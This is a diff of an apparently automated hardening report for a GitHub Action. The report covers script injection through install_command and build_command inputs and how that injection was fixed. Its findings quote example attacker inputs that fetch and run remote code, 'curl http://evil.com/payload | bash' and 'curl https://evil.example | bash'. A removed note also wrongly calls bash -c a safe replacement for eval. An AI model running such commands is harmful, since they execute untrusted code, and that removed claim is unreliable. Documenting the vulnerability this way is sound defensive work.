@@ -8,7 +8,7 @@
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
-**Harden Agent Version:** `1`
+**Harden Agent Version:** `2`
 
 Action **bitovi--github-actions-storybook-to-github-pages/v1.0.4** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).
 
@@ -16,12 +16,12 @@ Action **bitovi--github-actions-storybook-to-github-pages/v1.0.4** was hardened 
 
 ### script-injection (severity: high)
 
-The 'Build' step directly interpolates `${{ inputs.install_command }}` and `${{ inputs.build_command }}` as standalone shell commands inside a `run:` block (rule a). These are attacker-controlled inputs that are substituted verbatim into the shell script before execution, enabling arbitrary command injection. For example, a caller could pass `install_command: 'curl http://evil.com/payload | bash'`. The fix is to pass these values via environment variables and execute them safely (e.g., via `eval "$INSTALL_CMD"` with proper quoting, or better, restrict to known-safe commands).
+Sub-rule (a): The 'Build' step directly interpolates user-controlled inputs into a `run:` shell block without any sanitization or env-var indirection. Both `${{ inputs.install_command }}` and `${{ inputs.build_command }}` are expanded verbatim as shell commands, allowing any caller of this composite action to execute arbitrary shell code on the runner. For example, a caller could pass `install_command: 'curl https://evil.example | bash'`. These inputs must be moved into `env:` variables and then invoked via a safe mechanism (e.g., `eval "$INSTALL_COMMAND"` is still dangerous; the correct fix is to restrict the allowed commands or use a fixed command with parameterised arguments).
 
 Locations:
 
-- `action.yaml:43`
-- `action.yaml:44`
+- `action.yaml:38`
+- `action.yaml:39`
 
 ### static-inline-injection (severity: high)
 
@@ -47,7 +47,7 @@ Locations:
 
 **Notes:**
 
-Fixed script injection vulnerabilities in action.yaml at lines 43-44. The `${{ inputs.install_command }}` and `${{ inputs.build_command }}` expressions were directly interpolated as shell commands in the 'Build' step's `run:` block, enabling arbitrary command injection. Fixed by moving both expressions into the step's `env:` block as `INSTALL_COMMAND` and `BUILD_COMMAND` environment variables, then executing them in the shell script via `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This ensures the GitHub Actions expression substitution happens at the environment variable level rather than being directly embedded in the shell script text.
+Fixed all three findings (which all refer to the same two lines in action.yaml). Moved `${{ inputs.install_command }}` and `${{ inputs.build_command }}` from direct inline interpolation in the `run:` block into the step's `env:` map as `INSTALL_COMMAND` and `BUILD_COMMAND`. The shell script now executes them via `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This prevents GitHub Actions expression injection at the YAML/shell parsing boundary — the expressions are no longer expanded directly as shell syntax.
 
 ### Iteration 2
 
@@ -55,5 +55,5 @@ Fixed script injection vulnerabilities in action.yaml at lines 43-44. The `${{ i
 
 **Notes:**
 
-Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` with `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` in the 'Build' step of action.yaml. The inputs were already correctly isolated into environment variables (INSTALL_COMMAND and BUILD_COMMAND) via the step's `env:` block. The `eval` builtin was the specific security concern as it interprets variable content as arbitrary shell commands including shell metacharacters and function calls. Replacing with `bash -c` runs the commands in a subshell that doesn't inherit the parent shell's functions and aliases, removing the eval-based injection vector while preserving the action's functionality.
+Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` in the 'Build' step with safe xargs-based tokenization. Each command input is parsed into a bash array using `printf '%s' "$VAR" | xargs printf '%s\0'` with a null-delimited read loop, then executed as `"${cmd[@]}"`. This preserves multi-word commands like `npm run build-storybook` while preventing shell metacharacter injection (`;`, `|`, `&&`, `$()`, etc. are not interpreted). The `[ -n "$VAR" ]` guard prevents xargs from emitting an empty token when the input is empty.
 
